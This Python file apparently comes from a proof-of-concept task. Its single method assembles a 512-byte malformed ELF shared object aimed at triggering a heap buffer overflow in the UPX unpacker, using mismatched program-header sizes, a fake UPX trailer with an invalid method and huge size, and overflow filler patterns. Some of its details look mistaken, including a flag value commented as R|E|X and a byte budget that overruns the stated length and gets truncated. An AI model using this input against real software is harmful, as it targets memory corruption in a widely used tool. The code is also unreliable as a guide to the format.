import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Craft a minimal malformed ELF shared object to trigger UPX unpacker heap buffer overflow
        # Based on vulnerability in handling multiple program headers and compression methods
        # Length exactly 512 bytes

        # ELF64 Header (64 bytes)
        e_ident = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        e_type = struct.pack('<H', 3)  # ET_DYN (shared object)
        e_machine = struct.pack('<H', 0x3E)  # EM_X86_64
        e_version = struct.pack('<I', 1)
        e_entry = struct.pack('<Q', 0x401000)
        e_phoff = struct.pack('<Q', 64)
        e_shoff = struct.pack('<Q', 0)  # No section headers
        e_flags = struct.pack('<I', 0)
        e_ehsize = struct.pack('<H', 64)
        e_phentsize = struct.pack('<H', 56)
        e_phnum = struct.pack('<H', 3)  # Multiple PH to trigger method reset issue
        e_shentsize = struct.pack('<H', 0)
        e_shnum = struct.pack('<H', 0)
        e_shstrndx = struct.pack('<H', 0)
        elf_header = e_ident + e_type + e_machine + e_version + e_entry + e_phoff + e_shoff + e_flags + \
                     e_ehsize + e_phentsize + e_phnum + e_shentsize + e_shnum + e_shstrndx

        # Program Header 1: PT_LOAD (code segment, small file size, large memsz for potential overflow)
        p_type1 = struct.pack('<I', 1)  # PT_LOAD
        p_flags1 = struct.pack('<I', 5)  # R|E|X
        p_offset1 = struct.pack('<Q', 64 + 56*3)  # After PHs
        p_vaddr1 = struct.pack('<Q', 0x401000)
        p_paddr1 = struct.pack('<Q', 0x401000)
        p_filesz1 = struct.pack('<Q', 100)  # Small file size
        p_memsz1 = struct.pack('<Q', 1024)  # Larger memsz to encourage overflow
        p_align1 = struct.pack('<Q', 0x1000)
        ph1 = p_type1 + p_flags1 + p_offset1 + p_vaddr1 + p_paddr1 + p_filesz1 + p_memsz1 + p_align1

        # Program Header 2: PT_DYNAMIC (to trigger un_DT_INIT issues)
        p_type2 = struct.pack('<I', 2)  # PT_DYNAMIC
        p_flags2 = struct.pack('<I', 4)  # R
        p_offset2 = struct.pack('<Q', 0)
        p_vaddr2 = struct.pack('<Q', 0x600000)
        p_paddr2 = struct.pack('<Q', 0x600000)
        p_filesz2 = struct.pack('<Q', 200)  # Includes malformed DT entries
        p_memsz2 = struct.pack('<Q', 200)
        p_align2 = struct.pack('<Q', 8)
        ph2 = p_type2 + p_flags2 + p_offset2 + p_vaddr2 + p_paddr2 + p_filesz2 + p_memsz2 + p_align2

        # Program Header 3: Another PT_LOAD with potential bad method carryover
        p_type3 = struct.pack('<I', 1)  # PT_LOAD
        p_flags3 = struct.pack('<I', 6)  # R|W
        p_offset3 = struct.pack('<Q', 0)
        p_vaddr3 = struct.pack('<Q', 0x602000)
        p_paddr3 = struct.pack('<Q', 0x602000)
        p_filesz3 = struct.pack('<Q', 256)  # Larger to hit lowmem usage
        p_memsz3 = struct.pack('<Q', 512)  # Mismatch for overflow
        p_align3 = struct.pack('<Q', 0x1000)
        ph3 = p_type3 + p_flags3 + p_offset3 + p_vaddr3 + p_paddr3 + p_filesz3 + p_memsz3 + p_align3

        # Simulate malformed UPX-like compression trailer or data (to trigger decompression)
        # UPX packed files have a specific format; here we add junk to mimic invalid b_info.b_method
        upx_trailer = b'UPX!' + struct.pack('<I', 0x12345678)  # Fake UPX magic and offsets
        upx_trailer += struct.pack('<I', 1)  # Invalid method
        upx_trailer += struct.pack('<I', 0xFFFFFFFF)  # Large invalid size for overflow
        upx_trailer += b'\x90' * 32  # NOP sled or junk
        upx_trailer += struct.pack('<Q', 0xDEADBEEFCAFEF00D)  # Malformed DT_INIT pointer

        # Body: Some data to fill, including potential lowmem[0, xct_off) usage trigger
        body = b'\x00' * 200 + b'\x41' * 100 + struct.pack('<I', 0x41414141) * 5  # Patterns for overflow

        # Combine and pad to exactly 512 bytes
        poc = elf_header + ph1 + ph2 + ph3 + upx_trailer + body
        poc += b'\x00' * (512 - len(poc))  # Pad to 512 bytes

        return poc[:512]  # Ensure exactly 512
